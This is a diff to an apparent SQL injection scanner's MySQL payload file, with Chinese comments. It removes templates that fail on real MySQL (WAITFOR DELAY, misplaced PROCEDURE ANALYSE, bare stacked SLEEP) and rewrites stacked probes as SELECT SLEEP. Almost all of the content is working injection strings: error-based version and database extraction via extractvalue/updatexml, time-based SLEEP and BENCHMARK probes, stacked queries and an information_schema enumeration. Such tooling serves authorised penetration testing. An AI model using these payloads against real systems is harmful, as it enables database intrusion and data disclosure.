@@ -109,8 +109,9 @@ export const mysqlPayloads = {
     "{ORIG}),(1,(SELECT extractvalue(1,concat(0x7e,(SELECT database()))))) )-- -",
     "{ORIG}),(1,updatexml(1,concat(0x7e,(SELECT version())),1))-- -",
     "{ORIG}),(1,(SELECT 1/0))-- -",
-    // [SQLMAP-PARITY] PROCEDURE ANALYSE / JSON_KEYS expanded / GTID session / ST_X geometry / EXP double overflow / CAST truncation
-    "{ORIG}' AND PROCEDURE ANALYSE(EXTRACTVALUE(9, CONCAT(0x5c, (SELECT VERSION()))), 1)-- -",
+    // [OPT-FIX 2026-09-08] 移除 WHERE 位置的 PROCEDURE ANALYSE 模板：该语句只能紧跟 LIMIT
+    // （MySQL 5.x 语法；8.0 已整体移除），在 WHERE 上下文永远 1064 语法错误（真实 MySQL
+    // payload 合法性校验实测）。LIMIT 位置的等价变体保留于 CLAUSE_PAYLOADS.MySQL.limit.error。
     "{ORIG}' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7b, 0x22, VERSION(), 0x22, 0x7d)) USING utf8)), 1)-- -",
     "{ORIG}' AND GTID_SUBTRACT((SELECT SESSION_GTID_EXECUTED()), 0)-- -",
     "{ORIG}' AND ST_X(ST_GeomFromText(CONCAT(0x4c, 0x49, 0x4e, 0x45, 0x53, 0x54, 0x52, 0x49, 0x4e, 0x47, 0x28, 0x30, 0x20, 0x30, 0x2c, 0x31, 0x29)))-- -",
@@ -213,7 +214,9 @@ export const mysqlPayloads = {
   time: [
     "{ORIG}' AND SLEEP({SLEEP})-- -",
     '{ORIG}" AND SLEEP({SLEEP})-- -',
-    "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -",  // 兼容写法，主用 SLEEP
+    // [OPT-FIX 2026-09-08] 移除混入的 WAITFOR DELAY 模板：WAITFOR 是 SQL Server 语法，
+    // 在 MySQL 上永远 1064 语法错误（真实 MySQL payload 合法性校验实测）；
+    // SQL Server 专属向量保留在 payloads/sqlserver.js。
     "{ORIG} AND SLEEP({SLEEP})-- -",
     // —— 扩容：括号闭合组合 + BENCHMARK + 子查询变体 ——
     "{ORIG}') AND SLEEP({SLEEP})-- -",
@@ -253,17 +256,19 @@ export const mysqlPayloads = {
   ],
   // 堆叠注入：以 `;` 追加独立的延迟语句，若被执行则证明可堆叠多条语句
   stacked: [
-    "{ORIG}; SLEEP({SLEEP}) {SEP}",
-    "{ORIG}'; SLEEP({SLEEP}) {SEP}",
-    '{ORIG}"; SLEEP({SLEEP}) {SEP}',
+    // [real-MySQL FIX 2026-09-07] 裸 SLEEP(n) 作为独立语句在真实 MySQL 报 1064 语法错误
+    // （SLEEP 仅可在 SELECT 表达式内调用），此前 mock 靶场正则匹配掩盖了该缺陷。
+    // 统一改为 SELECT SLEEP(n) 形式（MySQL 堆叠标准写法）。
+    "{ORIG}; SELECT SLEEP({SLEEP}) {SEP}",
+    "{ORIG}'; SELECT SLEEP({SLEEP}) {SEP}",
+    '{ORIG}"; SELECT SLEEP({SLEEP}) {SEP}',
     "{ORIG}); SELECT SLEEP({SLEEP}) {SEP}",
     "{ORIG}') ; SELECT SLEEP({SLEEP}) {SEP}",
     "{ORIG}';SELECT SLEEP({SLEEP}) {SEP}",
     // —— 深度扩容：SLEEP 堆叠 + 注释符变体 + IF 条件延迟（非破坏性探测）——
-    "{ORIG}'; SLEEP({SLEEP})#",
-    "{ORIG}'; SLEEP({SLEEP})/**/",
+    "{ORIG}'; SELECT SLEEP({SLEEP})#",
+    "{ORIG}'; SELECT SLEEP({SLEEP})/**/",
     "{ORIG}'; SELECT IF(1=1,SLEEP({SLEEP}),0) {SEP}",
-    "{ORIG}); SLEEP({SLEEP}) {SEP}",
     "{ORIG}'; SET @sqli_probe=1; SELECT SLEEP({SLEEP}) {SEP}",
     // [SQLMAP-PARITY] GLOBAL_VARIABLES enumeration（只读，无副作用）
     "{ORIG}'; SELECT * FROM information_schema.GLOBAL_VARIABLES WHERE VARIABLE_NAME='version'-- -",
